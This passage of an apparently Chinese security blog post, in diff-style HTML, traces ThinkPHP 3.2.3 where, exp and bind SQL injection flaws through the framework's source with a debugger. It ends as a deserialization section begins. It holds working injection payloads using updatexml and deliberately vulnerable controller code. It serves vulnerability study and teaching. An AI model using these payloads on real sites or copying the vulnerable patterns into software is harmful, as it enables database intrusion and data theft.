+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们在<code>$id</code>和<code>$data</code>分别下断点</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719181856182.png"></p>
+<p>执行<code>id=1&#39;</code>，进行调试</p>
+<p>跟进到<code>ThinkPHP\Common\functions.php</code>的<code>I()</code>方法，接收<code>$name</code>参数</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719182045155.png"></p>
+<p>这里的<code>$name</code>的值就为<code>GET.id</code>，我们下断点理解容易点</p>
+<p>最后执行switch选择GET方法后break，<code>$input</code>数组为我们传参的<code>id=1&#39;</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720221132344.png"></p>
+<p>我们往下翻，由于<code>$name</code>不为空，那么来到第388行的elseif语句</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240719182848287.png"></p>
+<p>这里进行判断<code>$input</code>数组的<code>$name</code>是否为空，而<code>$name</code>就是我们GET传参的参数id。判断为真后赋值给<code>$data</code></p>
+<p>我们继续在第391行打上断点，调试发现执行完<code>$filters = isset($filter) ? $filter : C(&#39;DEFAULT_FILTER&#39;);</code></p>
+<p><code>$filters</code>被赋值为<code>htmlspecialchars</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720221231919.png"></p>
+<p>这部分代码无关紧要，我们跳到第406行看看</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720121516617.png"></p>
+<p>这里将<code>$filters</code>赋值给<code>$filter</code>也就是<code>htmlspecialchars</code>，然后如果该函数存在且<code>$data</code>不为数组，那么执行参数过滤也就是执行<code>htmlspecialchars($data)</code>。继续往后看，这里代码逻辑是如果<code>$data</code>为数组，那么执行以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive($data, &#x27;think_filter&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720122746298.png"></p>
+<p>我们把GET传参改为<code>?id[where]=1&#39;</code>，并在这里下断点进行调试</p>
+<p>跟进发现跳转到<code>think_filter()</code>方法，这里就是进行一个对SQL注入关键字的过滤</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720234336827.png"></p>
+<p>最后返回值<code>$data</code>即<code>1&#39;</code>，这里的返回值作为后面find方法的输入（非常关键）</p>
+<p>回到<code>Application\Home\Controller\IndexController.class.php</code>，把第9行和前面打的断点去掉，只留下第10行的断点，调试跟进一下</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720172553098.png"></p>
+<p>来到<code>ThinkPHP\Common\functions.php</code>的<code>M()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720172744907.png"></p>
+<p>这里传参进来的是<code>$name</code>为user，由于<code>$name</code>不存在<code>:</code>所以<code>$class</code>默认赋值为<code>Think\Model</code>。<code>$guid</code>也由于<code>$connection</code>为空所以进行拼接，我们下断点看看，结果为<code>user_Think\Model</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720174258722.png"></p>
+<p>然后因为<code>$_model</code>数组为空，所以这里进行实例化<code>Model</code>类</p>
+<p>下断点调试，直接F10逐过程跟进到<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>Model</code>类的find方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720222322968.png"></p>
+<p>这里我们单步调试一行行看，注意<code>$options</code>就是我们前面提到的返回值<code>$data</code>，如果为字符型或者数字型，那么赋值给<code>$options</code>数组的where键。类似下面在这种格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$options=[&quot;where&quot; =&gt; [&quot;id&quot; =&gt; &quot;1&#x27;&quot;]];</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这个地方是where注入的核心点，我们可以传递数组<code>$data</code>绕过if语句的赋值，通过类似污染的手段直接对<code>$options[&#39;where&#39;]</code>赋值来绕过后面的数据验证，具体分析后面会提到</p>
+</blockquote>
+<p>继续往后看这里调用<code>_parseOptions()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720185500361.png"></p>
+<p>跟进一下，注意到存在对传参数据进行验证</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720185656917.png"></p>
+<p>这里if条件均为真，继续到foreach对字段进行匹配，接着跟进一下<code>_parseType()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseType</span>(<span class="params">&amp;<span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;bind&#x27;</span>][<span class="string">&#x27;:&#x27;</span> . <span class="variable">$key</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>])) &#123;</span><br><span class="line">        <span class="variable">$fieldType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;enum&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 支持ENUM类型优先检测</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;bigint&#x27;</span>) &amp;&amp; <span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;int&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;float&#x27;</span>) || <span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;double&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">floatval</span>(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== <span class="title function_ invoke__">strpos</span>(<span class="variable">$fieldType</span>, <span class="string">&#x27;bool&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = (<span class="keyword">bool</span>) <span class="variable">$data</span>[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里会把 id 进行强制类型转换，我们的<code>1&#39;</code>变成<code>1</code>然后返回给<code>_parseOptions()</code>，最终带入<code>$this-&gt;db-&gt;select($options)</code>进行查询从而避免注入问题</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720225211676.png"></p>
+<p><strong>总结</strong></p>
+<p>注入点是where键，链子：传入<code>id=1&#39; -&gt; I() -&gt; find() -&gt; _parseOptions() -&gt; _parseType()</code> </p>
+<p>而我们的id参数被改变的位置就在<code>_parseType()</code>中，进入这个方法的位置是<code>ThinkPHP/Library/Think/Model.class.php:704</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>我们要不经过if语句才能不被强制类型转换，这里破坏的条件是<code>is_array($options[&#39;where&#39;])</code>，我们前面有讲到GET传参会赋值给where键，那么我们可以直接赋值where键即可实现绕过</p>
+<p><strong>被强制类型转换</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;         #变为1，即查询id=1的数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720235811333.png"></p>
+<p><strong>直接赋值绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]=1&#x27;       #查询不到id=1&#x27;的数据，成功注入</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240720235602341.png"></p>
+<p>以上就是整个where注入的代码逻辑</p>
+<hr>
+<h2 id="ThinkPHP3-2-3-exp注入漏洞"><a href="#ThinkPHP3-2-3-exp注入漏洞" class="headerlink" title="ThinkPHP3.2.3 exp注入漏洞"></a>ThinkPHP3.2.3 exp注入漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
+<p>修改一下<code>index()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">    $User = D(&#x27;user&#x27;);</span><br><span class="line">    $map = array(&#x27;id&#x27; =&gt; $_GET[&#x27;id&#x27;]);</span><br><span class="line">    $user = $User-&gt;where($map)-&gt;find();</span><br><span class="line">    var_dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p>执行POC，通过报错得到user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>注：这里后面的是<code>==</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721113425380.png"></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在入口文件的第9行下断点，执行<code>?id=1&#39;</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721120815180.png"></p>
+<p>调试跟进一下，在第654行下断点</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121007358.png"></p>
+<p>可以发现这里<code>$class</code>经过<code>parse_res_name()</code>处理赋值为<code>Home\Model\UserModel</code>。由于该类不存在进入elseif语句，然后if语句为false，继续进入else语句，<code>$class</code>赋值为<code>\Common\Model\userModel</code>。接着如果该类还不存在，那么实例化<code>Think\Model</code>类</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121627878.png"></p>
+<p>最后返回<code>Model</code>对象</p>
+<p>回到入口文件后接收GET参数id，然后调用<code>Model</code>类的<code>where()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721121946944.png"></p>
+<p><code>$where</code>就是我们传参的数组<code>[&quot;id&quot; =&gt; &quot;1&#39;&quot;]</code>，而这里前面的if语句都不满足，直接跳到最后。因为<code>options</code>数组不存在where键，所以执行<code>$this-&gt;options[&#39;where&#39;] = $where;</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721142227954.png"></p>
+<p>继续跟进到<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>Model</code>类的find方法，这里和where注入的代码逻辑差不多，不过我们没有绕过<code>_parseType()</code>方法。直接到<code>$this-&gt;db-&gt;select($options);</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143536019.png"></p>
+<p>在第822行下断点，调试跟进一下<code>select()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143648643.png"></p>
+<p>在第1039行下断点，继续跟进<code>buildSelectSql()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143740667.png"></p>
+<p>在第1060行下断点，继续跟进<code>parseSql()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143844490.png"></p>
+<p>这里将<code>$sql</code>查询语句中的参数进行替换，我们的<code>$option</code>数组如下</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721143950540.png"></p>
+<p>所以我们在第1079行下断点跟进<code>parseWhere()</code>方法，由于<code>$where</code>是数组，进入else语句</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721150702864.png"></p>
+<p>然后foreach遍历where数组赋值，后面的if语句均为flase直接到第586行执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$whereStr .= $this-&gt;parseWhereItem($this-&gt;parseKey($key), $val);</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>$key</code>要先经过<code>parseKey()</code>处理，继续跟进<code>parseWhereItem()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721151143041.png"></p>
+<p>这部分就是代码的核心，首先判断<code>$val</code>是否为数组，然后根据<code>$val[0]</code>的参数值不同来执行代码。接着如果<code>$exp</code>为bind或exp， <code>$whereStr</code>会将<code>$key</code>与<code>$val[1]</code>进行拼接，所以我们payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=exp&amp;id[1]==1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>注：进行拼接的时候<code>$val[1]</code>需要有<code>=</code>，这样拼接后SQL查询语句才正确</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240721151959256.png"></p>
+<p>最后再与where拼接替换到原SQL查询语句即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">... where `id` =1 and 1=updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p>以上就是整个exp注入的代码逻辑</p>
+<hr>
+<h2 id="ThinkPHP3-2-3-bind注入漏洞"><a href="#ThinkPHP3-2-3-bind注入漏洞" class="headerlink" title="ThinkPHP3.2.3 bind注入漏洞"></a>ThinkPHP3.2.3 bind注入漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
+<p>修改一下<code>index()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">    $User = M(&quot;user&quot;);</span><br><span class="line">    $user[&#x27;id&#x27;] = I(&#x27;id&#x27;);</span><br><span class="line">    $data[&#x27;password&#x27;] = I(&#x27;password&#x27;);</span><br><span class="line">    $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">    var_dump($valu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><p>执行POC，得到user</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>注：这里为<code>id[1]=0</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120123884.png"></p>
+<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们执行POC，在入口文件第12行下断点</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120651798.png"></p>
+<p>单步调试，跟进<code>ThinkPHP\Library\Think\Model.class.php</code>的<code>save()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722120921487.png"></p>
+<p>往下翻一下，这里代码逻辑和前面exp注入时分析的差不多</p>
+<p>出现<code>_parseOptions()</code>方法进行强制类型转换</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722121753096.png"></p>
+<p>继续往下在第480行下断点，跟进一下</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722121845772.png"></p>
+<p>这里我们可以看到有调用<code>parseWhere()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122234386.png"></p>
+<p>我们前面在exp注入分析的时候有提到过，会继续调用<code>parseWhereItem()</code>方法，然后根据<code>$id[1]</code>的值不同来执行代码，其中如果等于bind的话会与<code>=:</code>拼接</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122514332.png"></p>
+<p>我们尝试传入以下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=bind&amp;id[1]=aa</span><br></pre></td></tr></table></figure>
+
+<p>可以发现SQL语句报错</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722122603240.png">不难发现多了个冒号变成<code>:aa</code>，怎么样可以消除掉冒号呢？</p>
+<p>把GET传参改回POC，我们在第985行下断点跟进<code>parseSet()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722142136358.png"></p>
+<p>if语句不满足直接跳到第417的else语句，这里bind数组还是为空所以<code>$name</code>赋值为0，然后继续跟进<code>bindParam()</code>方法进行bind参数绑定，相当于得到<code>$bind</code>数组为<code>[&quot;:0&quot; =&gt;&quot;1&quot;]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected function bindParam($name, $value)</span><br><span class="line">&#123;</span><br><span class="line">	$this-&gt;bind[&#x27;:&#x27; . $name] = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里了解参数绑定过程后，单步跳出回到<code>update()</code>方法</p>
+<p>我们往下看注意第997行的<code>execute()</code>方法</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722125349581.png"></p>
+<p>跟进到 <code>ThinkPHP/Library/Think/Db/Driver.class.php:207</code>的<code>execute()</code></p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722125515834.png"></p>
+<p>重点看下面代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;bind)) &#123;</span><br><span class="line">    <span class="variable">$that</span>           = <span class="variable language_">$this</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;queryStr = <span class="title function_ invoke__">strtr</span>(<span class="variable">$this</span>-&gt;queryStr, <span class="title function_ invoke__">array_map</span>(function (<span class="variable">$val</span>) <span class="keyword">use</span> (<span class="variable">$that</span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>;&#125;, <span class="variable language_">$this</span>-&gt;bind));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的function是匿名函数，接收参数<code>$val</code>然后进行<code>escapeString()</code>处理（也就是转义处理），然后将<code>$val</code>拼接两个单引号并返回值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//匿名函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$val</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$that</span></span>) </span>&#123;	</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="variable">$that</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$val</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转义处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">escapeString</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了<code>array_map()</code>函数为数组的每个元素应用回调函数（上面说到的匿名函数），而bind数组为<code>[&quot;:0&quot; =&gt;&quot;1&quot;]</code>，所以执行结果为<code>&#39;1&#39;</code>，bind数组变为为<code>[&quot;:0&quot; =&gt;&quot;&#39;1&#39;&quot;]</code></p>
+<p>最后执行<code>strtr()</code>函数，我们在PHP中文手册查找下此函数，看下给的DEMO其实不难理解</p>
+<p>具体就以下两点</p>
+<ul>
+<li>第一个参数是目标字符串</li>
+<li>第二个参数是替换规则，由数组决定</li>
+</ul>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722144530409.png"></p>
+<p>所以我们bind数组就是替换规则，即<code>:0</code>替换成<code>&#39;1&#39;</code>。我们前面提到过<code>id[0]=bind</code>会使得查询语句与<code>:</code>拼接，而在这里我们让<code>id[1]</code>的值与<code>:</code>拼接后构造出<code>:0</code>，然后再被替换成<code>&#39;1&#39;</code>。所以这也是为什么我们POC会是0不是其他值</p>
+<p>我们下断点看看前后变化，可以发现经过构造使得SQL查询语句的<code>:0</code>均被替换</p>
+<p><img src="/article/ThinkPHP3-2-3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240722123631954.png"></p>
+<p>以上就是整个bind注入的代码逻辑</p>
+<hr>
+<h2 id="ThinkPHP3-2-3-反序列化漏洞"><a href="#ThinkPHP3-2-3-反序列化漏洞" class="headerlink" title="ThinkPHP3.2.3 反序列化漏洞"></a>ThinkPHP3.2.3 反序列化漏洞</h2><p>入口文件：<code>Application/Home/Controller/IndexController.class.php</code></p>
+<p>修改一下<code>index()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function index()&#123;</span><br><span class="line">    echo base64_decode($_GET[&#x27;payload&#x27;]);</span><br><span class="line">    $output=unserialize(base64_decode($_GET[&#x27;payload&#x27;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 